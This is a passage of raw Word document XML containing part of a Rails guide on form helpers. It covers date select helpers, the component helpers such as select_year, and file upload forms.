              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="485900198"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>{:person</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; {'birth_date(1i)'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; '2008', 'birth_date(2i)'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; '11', 'birth_date(3i)'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; '22'}}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0FF620B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When this is passed to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Person.new</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (or </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>update_attributes</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">), Active Record spots that these parameters should all be used to construct the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>birth_date</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> attribute and uses the suffixed information to determine in which order it should pass these parameters to functions such as </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Date.civil</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7052C59A"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4.3 Common Options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3273A81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Both families of helpers use the same core set of functions to generate the individual select tags and so both accept largely the same options. In particular, by default Rails will generate year options 5 years either side of the current year. If this is not an appropriate range, the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:start_year</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:end_year</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> options override this. For an exhaustive list of the available options, refer to the </w:t>
      </w:r>
      <w:hyperlink r:id="rId308" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>API documentation</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A038F9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As a rule of thumb you should be using </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>date_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> when working with model objects and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_date</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in other cases, such as a search form which filters results by date.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15A8273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In many cases the built-in date pickers are clumsy as they do not aid the user in working out the relationship between the date and the day of the week.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EF43107"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4.4 Individual Components</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2909DC8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Occasionally you need to display just a single date component such as a year or a month. Rails provides a series of helpers for this, one for each component </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_year</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_month</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_day</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_hour</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_minute</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_second</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. These helpers are fairly straightforward. By default they will generate an input field named after the time component (for example “year” for </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_year</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, “month” for </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_month</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> etc.) although this can be overridden with the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:field_name</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option. The </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:prefix</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option works in the same way that it does for </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_date</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_time</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and has the same default value.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5DA14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The first parameter specifies which value should be selected and can either be an instance of a Date, Time or DateTime, in which case the relevant component will be extracted, or a numerical value. For example</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="0C9FCD1B" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7500D4C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select_year(2009) %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BF04BF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select_year(Time.now) %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="698C2E0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will produce the same output if the current year is 2009 and the value chosen by the user can be retrieved by </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:date][:year]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41CE4BE9"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5 Uploading Files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2242F82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 common task is uploading some sort of file, whether it’s a picture of a person or a CSV file containing data to process. The most important thing to remember with file uploads is that the rendered form’s encoding </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MUST</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> be set to “multipart/form-data”. If you use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this is done automatically. If you use </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>form_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, you must set it yourself, as per the following example.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E37713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The following two forms both upload a file.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7200"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="650CDCF2" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="30005FB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form_tag({:action</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :upload}, :multipart</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; true) do</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1965DE8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file_field_tag 'picture'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7417C1F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4E789BB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03FA688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form_for @person</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r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|f| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="388849C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f.file_field :picture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5F83F9A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39851DF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Since Rails 3.1, forms rendered using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have their encoding set to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>multipart/form-data</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> automatically once a </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>file_field</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is used inside the block. Previous versions required you to set this explicitly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42DC1FD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provides the usual pair of helpers: the barebones </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>file_field_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and the model oriented </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>file_field</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. The only difference with other helpers is that you cannot set a default value for file inputs as this would have no meaning. As you would expect in the first case the uploaded file is in </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:picture]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and in the second case in </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:person][:picture]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11BF60E4"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5.1 What Gets Uploaded</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F4CB1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object in the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hash is an instance of a subclass of IO. Depending on the size of the uploaded file it may in fact be a StringIO or an instance of File backed by a temporary file. In both cases the object will have an </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
